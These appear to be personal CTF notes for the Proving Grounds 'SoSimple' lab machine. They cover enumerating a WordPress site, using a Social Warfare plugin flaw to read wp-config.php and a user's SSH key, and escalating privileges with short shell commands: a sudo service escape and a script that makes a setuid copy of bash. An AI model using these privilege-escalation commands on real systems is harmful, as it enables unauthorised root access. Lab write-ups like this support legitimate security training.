# Enumeration 



80/ Apache/2.4.41
http://192.168.168.78/wordpress/
![[Pasted image 20230104213144.png]]








# Exploitation 


[social warfare exploit](https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618)

![[Pasted image 20230104213542.png]]

Users:
root
steven
max

wp-config.php

![[Pasted image 20230104213845.png]]
trying to grap id_rsa from the users we found earlier using this exploit
and max worked
![[Pasted image 20230104214010.png]]

![[Pasted image 20230104213954.png]]






![[Pasted image 20230104214113.png]]
we are in












# Foothold - Privesc



![[Pasted image 20230104215629.png]]
![[Pasted image 20230104215700.png]]
[gtfobins](https://gtfobins.github.io/gtfobins/service/)

```
sudo -u steven service ../../bin/sh

```



![[Pasted image 20230104215800.png]]

there is no file /opt/tools/ so we create the file
```

mkdir /opt/tools
cd /opt/tools
echo "cp /bin/bash /tmp && chmod +s /tmp/bash" >> server-health.sh

```

![[Pasted image 20230104220016.png]]



![[Pasted image 20230104220528.png]]


 
# Conclusion

- website was using outdated plugin which lead to sensitive data exposure 
- user max and steven had sudo privs with no password needed which lead to privesc


---
Tags: #wordpress #proving_grounds #ctf #sudo_privesc #SoSimple
Resources:
[Proving Grounds](https://portal.offensive-security.com/labs/play) 